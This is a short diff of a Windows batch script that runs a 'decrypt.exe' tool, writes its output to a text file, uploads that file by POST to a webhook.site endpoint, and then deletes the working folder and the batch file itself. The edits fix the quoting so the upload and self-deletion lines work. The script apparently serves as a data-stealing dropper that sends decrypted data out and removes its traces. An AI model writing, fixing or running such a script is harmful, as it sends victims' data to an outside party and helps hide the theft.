@@ -9,11 +9,11 @@ start cmd.exe /k powershell -command "C:/Users/Decrypt/decrypt.exe | Out-File -F
 
 timeout /t 10
 
-start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/2deed7ff-a76b-4776-a15f-128f5bc846f8 -Method POST -InFile C:/Users/Decrypt/decrypt.txt;"
+start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/2deed7ff-a76b-4776-a15f-128f5bc846f8 -Method POST -InFile C:/Users/Decrypt/decrypt.txt;
 
 timeout /t 5
 
-start cmd.exe /k powershell -command Remove-Item -path "c:\Users\Decrypt, c:\Users\decrypt.bat -recurse;"
+start cmd.exe /k powershell -command Remove-Item -path c:\Users\Decrypt, c:\Users\decrypt.bat -recurse;
 
 timeout /t 5
 
